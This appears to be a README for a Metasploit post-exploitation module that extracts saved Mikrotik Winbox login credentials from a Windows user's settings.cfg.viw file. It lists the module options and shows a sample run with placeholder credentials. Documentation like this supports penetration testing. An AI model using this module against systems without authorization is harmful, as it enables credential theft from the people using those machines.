# Metasploit - winbox_settings

Post module for Metasploit to extracts Mikrotik Winbox password saved in the settings.cfg.viw file.

## Module options

```
Module options (post/windows/gather/credentials/winbox_settings):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  5                yes       The session to run this module on
   VERBOSE  false            no        HexDump settings.cfg.viw files
```

## Example

```
msf6 post(windows/gather/credentials/winbox_settings) > run

[*] VERBOSE: false
[*] Checking Default Locations...
[*] C:\Users\Administrator\AppData\Roaming\Mikrotik\Winbox\settings.cfg.viw not found ....
[*] Found File at C:\Users\FooBar\AppData\Roaming\Mikrotik\Winbox\settings.cfg.viw
[+] Login: ThisIsUsername
[+] Password: ThisIsPassword
[*] Post module execution completed
```
